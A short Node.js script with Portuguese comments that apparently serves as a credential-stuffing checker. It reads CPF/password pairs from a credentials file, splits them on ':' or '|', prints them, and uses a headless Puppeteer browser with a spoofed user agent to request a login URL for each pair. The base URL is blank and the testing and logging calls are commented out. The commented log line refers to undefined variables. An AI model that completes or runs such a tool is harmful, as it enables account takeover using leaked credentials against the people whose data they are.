const puppeteer = require('puppeteer');
const fsPromises = require('fs').promises;
const fs = require('fs');
const readline = require('readline');

const baseUrl = '';
const srcFolder = './src/credentials.txt';

// Função que roda o robô
async function robo(cpf, senha) {
    // Configurações gerais do robô
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36');

    try {
        // Abrindo a página
        const response = await page.goto(`${baseUrl}/${cpf}/${senha}`);
        await browser.close();

        return response.status();
    } catch (error) {
        await browser.close();

        return 'Ocorreu um erro ao verificar a URL';
    }
};

// Função para ler o arquivo das credenciais
async function handleReadFile() {
    const fileStream = fs.createReadStream(srcFolder);
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    var carregadas = 0;
    var testadas = 0;
    var aprovados = 0;
    var reprovados = 0;

    // Iterando no arquivo, para ler cada linha e separar os dados
    for await (const line of rl) {
        carregadas = carregadas + 1;
        if (line.includes(':')) {
            var cpf = line.split(':')[0];
            var senha = line.split(':')[1];

            console.log(`${cpf} - ${senha}`);

            // const response = await robo(cpf, senha);

            // Salvado log das consultas
            // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
        }
        if (line.includes('|')) {
            var cpf = line.split('|')[0];
            var senha = line.split('|')[1];

            console.log(`${cpf} - ${senha}`);

            // const response = await robo(cpf, senha);

            // Salvado log das consultas
            // await fsPromises.appendFile('log.txt', `URL: ${urlToCheck} | response: ${response} | Data: ${formatDate(date)} \n`);
        }
    }

    console.log(`Carregadas: [${carregadas}]`)
}

// Função para formatar datas
function formatDate(dateIn) {
    const dateOut = dateIn.getDate() + '/' + (dateIn.getMonth() + 1) + '/' + dateIn.getFullYear() + ' ' + dateIn.getHours() + ':' + dateIn.getMinutes() + ':' + dateIn.getSeconds();

    return dateOut;
}

handleReadFile();